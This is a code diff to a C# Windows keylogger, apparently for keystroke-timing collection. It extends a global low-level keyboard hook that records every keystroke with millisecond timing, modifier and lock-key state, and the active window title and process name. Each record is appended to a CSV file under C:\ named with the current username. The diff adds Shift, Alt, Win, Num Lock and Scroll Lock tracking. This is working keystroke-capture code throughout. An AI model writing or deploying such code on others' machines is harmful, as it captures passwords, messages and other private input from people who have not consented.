@@ -15,13 +15,21 @@ namespace dotnet_keylogger
         private const int WM_KEYUP = 0x0101; // Key down identifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keyup
         private const int WM_KEYDOWN = 0x0100; // Key down identifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keydown
         private const int WM_SYSKEYDOWN = 0x0104; // Alt key idnentifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-syskeydown
+        private const int WM_SYSKEYUP = 0x0105; // Alt key idnentifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-syskeydown
         private static LowLevelKeyboardProc _hook_callback_pointer = HookCallback; // Create a pointer to the callback function https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa
         private static IntPtr _hookID = IntPtr.Zero; // Mull Pointer that will be overwritten when hook registered
         private static DateTime currentTime;
         private static long lastMsgTime = 0;
         private static int lastScanCode;
         private static int lastFlags;
-        private static int capslock = 0;
+        private static int caps = 0;
+        private static int scroll = 0;
+        private static int num = 0;
+        private static int left_alt = 0;
+        private static int right_alt = 0;
+        private static int left_shift = 0;
+        private static int right_shift = 0;
+        private static int win = 0;
 
         private static StreamWriter sw;
 
@@ -60,21 +68,12 @@ namespace dotnet_keylogger
              * DWORD time = timestamp equivelant to GetMessageTime
              * ULONG_PTR dwExtraInfo = Pointer to extra info
              */
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && Marshal.ReadInt32(lParam) == (int)VirtualKeyStates.VK_CAPITAL)
-            {
-                capslock = 1 - capslock;
-            }
 
-
-            if (nCode >= 0 /*&& wParam == (IntPtr)WM_KEYUP*/)
+            
+            if (nCode >= 0)
             {
                 long diff = 0;
                 int vkCode = Marshal.ReadInt32(lParam);
-                if (vkCode == 0x14)
-                {
-
-
-                }
                 int scanCode = Marshal.ReadInt32(lParam + 4);
                 int flags = Marshal.ReadInt32(lParam + 8);
                 /// Skip repeat messages if a key if its being held down
@@ -82,7 +81,6 @@ namespace dotnet_keylogger
                 { return CallNextHookEx(_hookID, nCode, wParam, lParam); }
                 else
                 { lastScanCode = scanCode; lastFlags = flags; }
-                /// 
                 int timestamp = Marshal.ReadInt32(lParam + 12);
                 if (currentTime.Year == 1)
                 {
@@ -95,20 +93,82 @@ namespace dotnet_keylogger
                     currentTime = currentTime.AddMilliseconds(diff);
                 }
                 lastMsgTime = timestamp;
-                string windowTitle = GetActiveWindowTitle();
-                string windowName = GetActiveWindowName();
-                string[] elements = {
-                    currentTime.ToLongDateString(),
-                    (currentTime.ToLongTimeString() + ":" + currentTime.Millisecond.ToString("D3")),
-                    capslock.ToString(),
-                    flags.ToString(),
-                    diff.ToString("D3"),
-                    ((Keys)vkCode).ToString(),
-                    windowTitle,
-                    windowName
-                };
-                string line = string.Join(",", elements);
-                sw.Write(line + "\r\n");
+                int kflags = 0x00000000;
+
+                if (wParam == (IntPtr)WM_SYSKEYDOWN)
+                {
+                    switch (vkCode)
+                    {
+                        case (int)VirtualKeyStates.VK_LALT:
+                            left_alt = 1;
+                            break;
+                        case (int)VirtualKeyStates.VK_RALT:
+                            if (right_alt == 1)
+                            { return CallNextHookEx(_hookID, nCode, wParam, lParam);}
+                            right_alt = 1;
+                            break;
+                        case (int)VirtualKeyStates.VK_LCON:
+                            /// Some weird bug where right alt send alternating ralt and lcon
+                            if (right_alt == 1)
+                            { return CallNextHookEx(_hookID, nCode, wParam, lParam); }
+                            break;
+                    }
+                }
+                if (wParam == (IntPtr)WM_KEYDOWN)
+                {
+                    switch (vkCode)
+                    {
+                        case (int)VirtualKeyStates.VK_CAPITAL:
+                            caps = 1 - caps;
+                            break;
+                        case (int)VirtualKeyStates.VK_NUM:
+                            num = 1 - num;
+                            break;
+                        case (int)VirtualKeyStates.VK_SCROLL:
+                            scroll = 1 - scroll;
+                            break;
+                        case (int)VirtualKeyStates.VK_LSHIFT:
+                            left_shift = 1;
+                            break;
+                        case (int)VirtualKeyStates.VK_RSHIFT:
+                            right_shift = 1;
+                            break;
+                        case (int)VirtualKeyStates.VK_LWIN:
+                            win = 1;
+                            break;
+                    }
+                }
+                if (wParam == (IntPtr)WM_KEYUP)
+                {
+                    switch (vkCode)
+                    {
+                        case (int)VirtualKeyStates.VK_LSHIFT:
+                            left_shift = 0;
+                            break;
+                        case (int)VirtualKeyStates.VK_RSHIFT:
+                            right_shift = 0;
+                            break;
+                        case (int)VirtualKeyStates.VK_LWIN:
+                            win = 0;
+                            break;
+                        case (int)VirtualKeyStates.VK_LALT:
+                            left_alt = 0;
+                            break;
+                        case (int)VirtualKeyStates.VK_RALT:
+                            right_alt = 0;
+                            break;
+                    }
+                }
+                kflags += scroll << 7;
+                kflags += num << 6;
+                kflags += caps << 5;
+                kflags += left_alt << 4;
+                kflags += right_alt << 3;
+                kflags += left_shift << 2;
+                kflags += right_shift << 1;
+                kflags += win;
+                keylog K = new keylog(currentTime, diff, lParam, (byte)kflags, GetActiveWindowTitle(), GetActiveWindowName());
+                sw.Write(K.ToCSV());
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -137,7 +197,29 @@ namespace dotnet_keylogger
             {
                 int temp = (int)GetKeyState(VirtualKeyStates.VK_CAPITAL);
                 if (temp == -128 || temp == -127) { continue; } /// If depressed right now, skip
-                capslock = temp;
+                caps = temp;
+                Thread.Sleep(100);
+            }
+        }
+
+        private static void TrackScrollLock()
+        {
+            while (true)
+            {
+                int temp = (int)GetKeyState(VirtualKeyStates.VK_SCROLL);
+                if (temp == -128 || temp == -127) { continue; } /// If depressed right now, skip
+                scroll = temp;
+                Thread.Sleep(100);
+            }
+        }
+
+        private static void TrackNumLock()
+        {
+            while (true)
+            {
+                int temp = (int)GetKeyState(VirtualKeyStates.VK_NUM);
+                if (temp == -128 || temp == -127) { continue; } /// If depressed right now, skip
+                num = temp;
                 Thread.Sleep(100);
             }
         }
@@ -148,10 +230,15 @@ namespace dotnet_keylogger
             Process[] p = Process.GetProcessesByName(pname);
             if (p.Length > 1)
                 Environment.Exit(0); /// already running, time to go bye bye
-            sw = new StreamWriter(@"C:\keylog_" + pname + "--" + Environment.UserName + @".csv", true);
+            sw = new StreamWriter(@"C:\keylog_" + pname + "_" + Environment.UserName + @"_v2.csv", true);
             sw.AutoFlush = true;
             Thread thread_capslock_track = new Thread( new ThreadStart(TrackCapsLock));
             thread_capslock_track.Start();
+            Thread thread_scrolllock_track = new Thread(new ThreadStart(TrackScrollLock));
+            thread_scrolllock_track.Start();
+            Thread thread_numlock_track = new Thread(new ThreadStart(TrackNumLock));
+            thread_numlock_track.Start();
+
             _hookID = SetHook(_hook_callback_pointer);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
@@ -189,8 +276,18 @@ namespace dotnet_keylogger
         enum VirtualKeyStates : int // https://www.pinvoke.net/default.aspx/user32.getkeystate
         {
             VK_CAPITAL = 0x14,
+            VK_NUM = 0x90,
+            VK_SCROLL = 0x91,
+            VK_LSHIFT = 0xA0,
+            VK_RSHIFT = 0xA1,
+            VK_LALT = 0xA4,
+            VK_RALT = 0xA5,
+            VK_LWIN = 0x5B,
+            VK_LCON = 0xA2
         }
             [DllImport("user32.dll")]
         static extern short GetKeyState(VirtualKeyStates nVirtKey);
     }
+
+
 }
